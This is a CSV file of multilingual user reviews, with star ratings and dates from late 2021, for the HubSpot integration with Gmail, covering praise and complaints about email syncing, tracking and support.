User Review,Star Rating,Date
Ótima ágil e eficiente. Me ajuda no dia a dia na comunicação com novos prospects.,5 of 5,Oct 28 2021
Works well if you want all mail to be controlled by HubSpot but falls down when only some mail is to be managed - even if no mail is to be managed.,2 of 5,Oct 28 2021
Con la vinculación de Gmail y HubSpot el seguimiento con los clientes se queda guardado no importa si se contesta desde Gmail o HubSpot el seguimiento se queda guardado. Me encanta que desde Gmail esta vinculada la empresa y así puedo acceder rápidamente a la empresa en HS,5 of 5,Oct 28 2021
Browser-based email is the f-ing worst interface. Bring back command line!,1 of 5,Oct 27 2021
Sim. Com o uso do Gmail traz muita facilidade pois conseguimos ter um acesso quase único junto ao HubSpot.,5 of 5,Oct 27 2021
Estoy acostumbrada porque es mi cuenta personal adicional a que tienes todo el ecosistema de calendario reuniones y contactos. Esta integración de plataformas mejora la agilidad en las actividades diarias.,5 of 5,Oct 27 2021
Espectacular la experiencia con HubSpot. Nos ha permitido automatizar nuestro trabajo. Espero pronto unir mas herramientas del sistema.,5 of 5,Oct 26 2021
I would say is bad because I'm missing tickets from my customers. Emails do not reach HubSpot!,2 of 5,Oct 26 2021
Gmail in Google Workspace works pretty well and I love it. Itegration with HubSpot is easy set in HubSpont Email settings,5 of 5,Oct 26 2021
This is a must-use integration for HubSpot & Gmail clients. It is one of my main sales tools and a true g-d send.,5 of 5,Oct 25 2021
I love to know what the team is up to and to be able to arrange meeting and keep record of all meetings in HubSpot.,5 of 5,Oct 25 2021
It is simple to use. It is direct. easy to manage and setup in a way that works for our business.,4 of 5,Oct 25 2021
Funktioniert sehr stabil. Ich bin zufrieden. Lediglich die Erstellung von Aufgaben in Gmail direkt könnte noch etwas flexibler gestaltet sein.,5 of 5,Oct 25 2021
me parace todo lo que por el momento se haces va bastante bien. Para poder dar una valoración más concreta debo seguir aprendiendo a usar todas las funcionalidades posibles. En base a esto debep decir que los correos con tips de com usar tanto HubSpot como gmail son excelentes.,4 of 5,Oct 25 2021
Fair nothing special hard to get answers to questions help and support weak,3 of 5,Oct 22 2021
Perfeitamente não tenho o que reclamar do gmail conectado ao HubSpot. Até o momento tem me atendido demais,5 of 5,Oct 22 2021
Funciona muy bien es una excelente herramienta la cual es compatible con varias herramientas,5 of 5,Oct 22 2021
Ojalá podiera uno seleccionar qué correos son para enrutar y cuáles no. Quisiera saber también más de HubSpot ya que solo lo he usado una vez.,3 of 5,Oct 21 2021
Gmail is ok. HubSpot still trying to learn the ins and outs of it and how ity works with my Ion Capital Solutions business,3 of 5,Oct 21 2021
Gmail es una herramienta fácil de utilizar para gestión de correos. El agregar utilidades de monitoreo de comunicaciones apoya la gestión de la comunicación y diseño de estrategias a partir de la información.,4 of 5,Oct 21 2021
Buena  pero mejorable. Hay muchas funciones que no son faciles de ajustar  igual creoque la ayuda existe y no la he buscado lo suficiente,4 of 5,Oct 21 2021
No information to fix HubSpot - Gmail fix limited only to some overarching general guides. Documentation is poor. Driving our organisation crazy.,1 of 5,Oct 21 2021
0. horrible. affects negatively tremendously. no support whatsoever!!I i have been trying to get help by all means but nobody answer me. please help me asap. thanks!,1 of 5,Oct 20 2021
All working fine for my needs. Simple to use and understand when training others to use.,5 of 5,Oct 20 2021
Sim está funcionando normalmente. Muito bom esse aplicativo.. Melhor experiência,5 of 5,Oct 20 2021
This review is specifically for Gmail integration with SalesHub and not HubSpot overall. My work is done primarily within Gmail and you are not auto-alerted within Gmail in a user-friendly way. You have "open" SalesHub to see a list of relevant activities/opens/clicks etc.. instead of being able to see them in Gmail. Also the reporting features are very limited and you cannot "batch enroll" a list of leads/contacts. SalesHub caps at 50 contacts -- not very efficient... Compared to MixMax and SalesLoft -- SalesHub significantly falls short of being a sales-centric tool.,1 of 5,Oct 20 2021
Algunas funciones no se encuentran habilitadas. El espacio de la firma electronica es mayor al del cuerpo del correo,4 of 5,Oct 19 2021
Gmail and G Suite work very well for us on the whole. Only issue is deeply nested messages are not easy to work with,4 of 5,Oct 19 2021
Task reminders notifications through Gmail is a real added value compare to other CRMs (eg SalesForce),5 of 5,Oct 19 2021
Fine................................................................................,3 of 5,Oct 18 2021
In general HubSpot is a helpful tool for sales. However the Gmail integration could be more user-friendly especially (at least in my case) tagging email threads to specific projects. I'm having trouble locating the correct project. An auto-fill search feature that works is all I need. I have multiple projects per vendor/contact so that may lead to confusion.,3 of 5,Oct 18 2021
Can track notes and e-mails and any communication that was had in one spot. Makes it easier to follow up on calls as well as set up tasks...weekly,4 of 5,Oct 18 2021
excelente herramienta solución simple e intuitiva favorece el cierre de ventas,5 of 5,Oct 18 2021
Me funciona bien me da facilidades en el seguimiento de los correos dentro de la empresa.,5 of 5,Oct 18 2021
Muy bien facilita el trabajo en gran medida y ofrece una linea de conexión con los clientes. Está muy bien integrado y quizas falta poder sincronizar la firma en lugar de ponerla en cada sitio por separado,5 of 5,Oct 18 2021
Funciona bien y la incidencia ha sido muy positiva como complemento al resto de herramientas.,4 of 5,Oct 18 2021
I have a lot of ideas on how this could improve. I use it every day. It's just not everything I want it to be. It's close but its just not quite there.,3 of 5,Oct 17 2021
I have a lot of meetings and having them pop up and easy to access through slack saves a lot of clicking.,5 of 5,Oct 16 2021
Bien me está ordenando. Falta un poco de claridad en la asistencia técnica,4 of 5,Oct 15 2021
Gmail is brilliant. I love the tools and apps I can add to it to creat my workspace.,5 of 5,Oct 14 2021
It's been difficult to go from SFDC to HubSpot to be honest. the template editing is not great neither as it does not refresh,2 of 5,Oct 14 2021
The perfect application! EVERRYTHING YOU NEED IS AT THE TIP OF YOUR HANDS! I LOVE HOW IT CREATES TEMPLATES AFTER IT NOTICES YOU COPYING AND PASTING! IT IS A PHENOMENAL APP!,5 of 5,Oct 14 2021
Gmail is a bit delayed in syncing with HubSpot ( when a lead is assigned). which might be critical when a direct demo is associated to one contact.,3 of 5,Oct 14 2021
Creo que el funcionamiento es bueno y el hecho de que esté ligado a HubSpot es genial pero creo que le añadiría funciones como por ejemplo el poder incluir "tarea" en el email o poder incluir las plantillas que tenemos en HubSpot desde gmail. Estas 2 funciones estaría bien tenerlas diponibles igual que está disponible la casilla de "seguimiento".,4 of 5,Oct 14 2021
Great to be able to be in HubSpot or Gmail and move freely between the two,4 of 5,Oct 13 2021
We will never look back We are very happy with the choice we made as a business to proceed with this service.,5 of 5,Oct 13 2021
Funciona bien y me permite crecer en mi negocio.Porque con las nuevas funcionalidades se logra mas productividad.,5 of 5,Oct 13 2021
Gmail works fine. HubSpot messages end up not reaching the target audience. Why do I need 75 characters for feedback? It is terrible,1 of 5,Oct 13 2021
great CRM very extensive in capability... I am only an employee as a user and this CRM is very good at helping to guide my outbound calls and prospecting each day. Additionally- it seems great for reports that my employer needs to monitor as well.,5 of 5,Oct 12 2021
Personalmente prefiero trabajar con otro software que permita trabajar con carpetas (folders). Con el gmail trabajar y archivar con carpetas es muy incómodo porque es un árbol que se despliega con el paso del mouse en una ventana muy pequeña para mi forma de trabajo,2 of 5,Oct 12 2021
tres simple d utilisation,2 of 5,Oct 12 2021
Fine with Google Chrome G-Mail and HubSpot to connect. I would like to know how to find Schedule Task to HubSpot.,5 of 5,Oct 11 2021
Improved my sales process completely by integrating my HubSpot CRM into Gmail.,5 of 5,Oct 11 2021
Es practico de usar me sirven mucho las plantillas para enviar mensajes a los clientes,5 of 5,Oct 10 2021
IT is helping me receive more connections. I have been able to book more meetings using gmail with HubSpot than my last CRM,4 of 5,Oct 8 2021
Does not work on Mozilla Firefox. I use Firefox through choice and this contractual stitch-up means that I am having to use two different browsers at once.,2 of 5,Oct 8 2021
we do not have gmail we use microsoft,5 of 5,Oct 7 2021
Gmail and Google Docs are a daily fundamental for our small business. Add to those the ease of use of our Youtube channel and it's a huge win for us.,5 of 5,Oct 7 2021
Working really well! The automated integration makes it easy to log Emails and conversations.,5 of 5,Oct 7 2021
I'm having problems with saving the emails and attachments into the deals when I'm receiving them,3 of 5,Oct 7 2021
The Gmail integration works very well. I set it up years ago and often forget it's not just a part of Gmail!,4 of 5,Oct 6 2021
SE TRABAJA MUY BIEN CON LA PLATAFORMA Y GMAIL LA INTEGRACION ES MUY BUENA Y SENCILLA DE USAR,5 of 5,Oct 6 2021
WISELY DESIGNED VERY SENSITIVE TO GMAILVERY RICH IN DATA VERY VERY VERY GOOD,5 of 5,Oct 6 2021
Reduce time and effort on email communication data exchange tracking customer actions building a customer profile,5 of 5,Oct 6 2021
Bien. Es una buena integración me encanta enviar un mail y verlo todo en HubSpot luego,4 of 5,Oct 5 2021
buena herramienta buena herramienta buena herramienta buena herramienta buena herramienta buena herramienta.,4 of 5,Oct 5 2021
100 % perfect wont change as its important for so many features see above,5 of 5,Oct 4 2021
Random. Los contactos y las empresas no son generados sistemáticamente y eso genera desconfianza. Puede que deje de usar HubSpot.,2 of 5,Oct 4 2021
Gmail works well for us and meets all expectations. Ease of use connection to other applications pricing.,5 of 5,Oct 2 2021
Gmail is fine. HubSpot is fine. But the two don’t work together well from a phone or IPad. I have to put in a bcc or forward code to get HubSpot to log my emails sent from gmail. Also why can’t I attach a file to an email sent from HubSpot?,2 of 5,Oct 1 2021
Muy bien me ha funcionado acorde a mis necesidades tiene una buena interface.,5 of 5,Oct 1 2021
Gmail has always been great. Have never had a problem with Gmail or google products.,2 of 5,Oct 1 2021
I get multiple notifications on my phone that someone opened my emails but in many cases I know I am getting the notifications late or incorrectly. I know this because for awhile it was sending me notifications that my boyfriend was opening a email repeatedly but he said he was not. And from clients I will get like 10 notifications that they opened an email and I doubt that they opened it 10 times. And I wish that when I sent an email directly from my gmail HubSpot would let me know if someone clicked any of the links. That would be helpful.,3 of 5,Oct 1 2021
5 stars hands down. The notification and interface are stellar and easy to use and figure out.,5 of 5,Sep 30 2021
Funciona bastante bien puedo encontrar todo lo necesario con facilidad de modo a responder a la demanda de los clientes,5 of 5,Sep 30 2021
I love it the time it saves me on logging communications and emails is amazing...,5 of 5,Sep 30 2021
Not satisfied at all. Frustrated with functionality. Stopped my outreaching altogether,1 of 5,Sep 29 2021
Grateful to have this integration but much could be improved. Would like to see more automatic triggering of syncing new email chains with contacts in HubSpot (not having to remember to BCC a random email address). I'd also like to see more control over which new contacts are created in HubSpot (i.e I don't want emails to non-leads to end up in HubSpot).,2 of 5,Sep 29 2021
O gmail está funcionando muito bem pra mim tanto com agendas quanto com o calendário. Com essa integração eu diminuo o meu tempo de manuseio em tarefas repetitivas e tenho menos perdas de oportunidades em agendamentos com a facilidade do link de reuniões - e o melhor sem custo para a minha empresa que ainda é pequena e precisa desse dinheiro em outros lugares.,5 of 5,Sep 29 2021
Funciona perfectamente y la integración es muy buena . Muy fácil de usar  intuitiva. Me gusta que además notifica cuando abren un correo,5 of 5,Sep 29 2021
It is working great. It would be great if there was integration with the native mac mail system as this is what I was using but it has not been too difficult to run gmail for biofab through a web browser. it is definitely worth doing that to have the HS plug in there.,5 of 5,Sep 28 2021
I love the plugin. It is really the key feature of HubSpot for me. The min 7,4 of 5,Sep 28 2021
ITS ME NOW I havent taken the time to truly give it a shot .. This system takes time that takes me away from selling,3 of 5,Sep 27 2021
não consigo integrar o email por isso não consigo beneficiar da integração que existe entre as duas marcas,1 of 5,Sep 27 2021
Funciona bien el seguimiento y el registro de los contactos. Sin embargo de un tiempo para acá cada vez que envío un correo desde Gmail la extensión de HubSpot hace que se copie mi correo (Del cual estoy enviando) en cco y llega como copia a la bandeja de entrada lo cual es sumamente desesperante. Intenté desintalar la extención y sin ella funciona normal lo que quiere decir que es un problema de la extención de HubSpot. Intente ver en el blog de usuarios y hablar con un asesor pero no consigo la solución.... Muy triste,2 of 5,Sep 27 2021
Duas grandes ferramentas que não fico sem em meu negócio. Muito bom e útil os recursos disponíveis.,5 of 5,Sep 27 2021
Great alternative to connecting your inbox to HubSpot when you want to pick and choose what gets recorded.,5 of 5,Sep 24 2021
GMAIL funciona bem sim. o tracking de mensagens de email relacionados com tickets HubSpot e negocios abertos não funciona bem,3 of 5,Sep 24 2021
WOW so easy to use. You can easily add people to sequences use snippets and I love the open receipts that I get. If you use google just get the integration.,5 of 5,Sep 24 2021
i can access work anywhere instead of installing outlook in my personal devices,5 of 5,Sep 24 2021
Using HubSpot with Gmail is a deterrent to our business efficiency. It would behoove HubSpot to seek closer integration with other email platforms to see greater adoption from teams that must prioritize task allocation and operations through integrated communications over marketing and sales.,2 of 5,Sep 23 2021
Default option to send to HubSpot must be OFF. Instead it's by default ON thus all my personal emails also sometimes ends up in HubSpot.,1 of 5,Sep 23 2021
It's really nice. It allows me to schedule emails / sync all communication and allows me to easily change properties directly from the right side panel,5 of 5,Sep 22 2021
Efficient Great Easy to use Able to organize everything Wish Google groups was this way,5 of 5,Sep 22 2021
This combination is perfect it helps me understand what is going on with the email I sent after it left my side. :),5 of 5,Sep 22 2021
It integrates well and its a lot of improvement comparing just to couple years back esspecialy working with different accounts simultaneously,5 of 5,Sep 22 2021
una información mas eficiente xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,5 of 5,Sep 22 2021
Gmail is not only mail program. It whole communication centre which helps keep all in one place.,4 of 5,Sep 21 2021
Mala hace cosas que no quiero que haga y no es claro como deje de hacer lo que uno no quiere,2 of 5,Sep 21 2021
It ended up creating an entire company record for the 3rd party that was not necessary and I can't cleanly merge it in with my original client record,2 of 5,Sep 21 2021
.......................................................................................,5 of 5,Sep 21 2021
It's great. Love that any communication sent is tracked on a contacts record on HubSpot,5 of 5,Sep 21 2021
xgfjfgjfghfhgfghfghfghfghfghfghdfserwersdshyjukytyuytuyfghghffgdfgddfgdsdgsdgsdfsdfsdfsdfh,5 of 5,Sep 20 2021
Emails that were recorded in early September are now missing. Can someone please find them?,1 of 5,Sep 20 2021
Gmail works great HubSpot in this instance is garbage literally it has me worrying about who received a personal email from me that would be a contact in HubSpot now up to 13 recipients when I only sent it to 4 people wtf!!!,1 of 5,Sep 20 2021
It great so far! I am getting used to it and the integration with HubSpot is really something which added more features.,4 of 5,Sep 20 2021
Its good Its goodIts goodIts goodIts goodIts goodIts goodIts goodIts goodIts goodIts goodIts good,5 of 5,Sep 17 2021
NA - There was NO call from HubSpot at the arranged time....................,1 of 5,Sep 17 2021
Sometimes when I answer to an email on Gmail it doesn't sync directly with HubSpot and I have to log it manually.,3 of 5,Sep 16 2021
It has been good but the HubSpot attachement creates contacts from a person's email domain. should be an option to select an account to attach.,4 of 5,Sep 16 2021
Es la herramienta de trabajo que utilizamos en la empresa de trabajo para cotizar y estar en contacto con los clientes,1 of 5,Sep 15 2021
Very nice! I am very please with the HubSpot and Gmail integration easy to use and lots of functionality. Reliable too!,5 of 5,Sep 15 2021
Es el mail por preferencia pero no tiene ninguna diferenciación de otras . Es simplemente la que utilizamos.,3 of 5,Sep 14 2021
me funciona a la perfección no me gusta que no tenga como agrupar por carpetas mis correos y que lleguen directamente a esa carpeta los correos seleccionados eso me daría mas orden a la hora de ver mi correo.,5 of 5,Sep 14 2021
positivamente para cumplir con los requerimientos y las metas establecidas,5 of 5,Sep 14 2021
It makes it easier to do my job on a daily basis. I find it helpful and easy to use.,4 of 5,Sep 13 2021
Helps with tracking and organization. Ease of searching and finding emails through keywords.,4 of 5,Sep 13 2021
En general funciona bien y me da cobertura a la mayoría de las necesidades que tengo en comunicación.,5 of 5,Sep 13 2021
The hub spot GMail integration didn't work for me it said I don't have an email account associated with,1 of 5,Sep 12 2021
Reply Emails Not Tracked. Wished They Were. When sending emails thru HubSpot the original email seems to contain tracking info but subsequent replies to the same thread dont seem to auto-integrate and need to be logged manually. not sure if this is the case or if we are just using the features incorrectly.,2 of 5,Sep 10 2021
Tricky to manage Tickets by using emails. easy to track emails by using HubSpot plugin,3 of 5,Sep 10 2021
This is one of the better Gmail integrations out there. All emails can be tagged if you want to track them if yes the contact gets created in HubSpot existing contacts the mail is linked as a communication history. You can tag the email to be linked to contact deal and/or organization. Amazing tool to keep track of communication history.,5 of 5,Sep 10 2021
I don't know how I would function without this integration. I've used both gmail and outlook and I would say that the outlook plugin is more useful mainly because I'm able to easily schedule new tasks while in gmail. There is some room for improvement however.,4 of 5,Sep 9 2021
